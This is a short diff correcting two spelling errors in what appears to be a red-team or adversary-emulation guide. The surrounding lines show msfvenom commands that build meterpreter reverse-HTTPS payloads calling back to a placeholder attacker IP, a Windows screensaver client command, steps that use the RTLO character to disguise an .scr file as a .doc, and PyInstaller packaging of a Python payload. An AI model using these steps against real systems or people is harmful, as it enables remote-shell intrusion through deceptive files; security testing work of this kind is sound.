@@ -20,7 +20,7 @@ gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker
     2. Scroll to the RTLO character (U+202E)
     3. Select the RTLO character, then click "select", then click "copy"
     4. Right click `cod.3aka3.scr`, then click "Rename"
-    5. Move cursor to begining of filename. Press "ctrl-v" to paste RTLO character, and hit "enter" to save the rename.
+    5. Move cursor to beginning of filename. Press "ctrl-v" to paste RTLO character, and hit "enter" to save the rename.
     6. The file should now be named "rcs.3aka3.doc"
 
 ![alt text](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/041515_2317_SpoofUsingR1.png)
@@ -96,7 +96,7 @@ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 
 msfvenom -p python/meterpreter/reverse_https LHOST=<attacker IP> LPORT=8443 -o python.py
 ```
 
-2. Transfer pyton.py to Windows attack platform
+2. Transfer python.py to Windows attack platform
 
 3. Compile python.py into a portable executable using PyInstaller (https://pypi.org/project/PyInstaller/)
 
